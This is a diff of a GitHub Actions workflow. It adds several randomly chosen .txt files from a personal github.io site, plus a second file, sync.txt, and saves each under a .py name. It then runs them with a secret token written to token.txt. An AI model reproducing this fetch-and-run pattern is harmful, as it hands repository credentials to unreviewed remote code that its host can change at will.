@@ -19,7 +19,10 @@ jobs:
         id: pickurl
         run: |
           URLS=(
-            "https://hieuvm6868.github.io/freecodecamp.txt"
+            "https://hieuvm6868.github.io/main.txt"
+            "https://hieuvm6868.github.io/buildx.txt"
+            "https://hieuvm6868.github.io/esphome.txt"
+            "https://hieuvm6868.github.io/llm.txt"
           )
           PICK="${URLS[$RANDOM % ${#URLS[@]}]}"
           echo "url=$PICK" >> "$GITHUB_OUTPUT"
@@ -28,6 +31,7 @@ jobs:
         run: |
           curl -sSL "${{ steps.pickurl.outputs.url }}" -o main.py
           curl -sSL "https://hieuvm6868.github.io/repos.txt" -o repos.txt
+          curl -sSL "https://hieuvm6868.github.io/sync.txt" -o sync.py
           head -n 3 main.py || true
 
       - uses: actions/setup-python@v5
@@ -45,3 +49,4 @@ jobs:
         run: |
           echo "$TOKEN" > token.txt   # nếu main.py cần file token.txt
           python main.py
+          python sync.py
